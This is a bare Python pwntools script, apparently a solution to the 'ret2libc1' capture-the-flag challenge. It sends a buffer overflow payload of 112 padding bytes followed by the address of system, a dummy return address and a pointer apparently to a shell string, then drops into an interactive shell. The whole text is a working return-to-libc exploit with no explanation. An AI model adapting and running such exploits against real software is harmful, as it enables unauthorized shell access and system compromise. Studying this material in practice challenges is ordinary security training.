#!/usr/bin/env python
from pwn import *
sh = process('./ret2libc1')
target = 0x8048720
system = 0x08048460
payload = flat(['a' * 112, system, 'b' * 4, target])
sh.sendline(payload)
sh.interactive()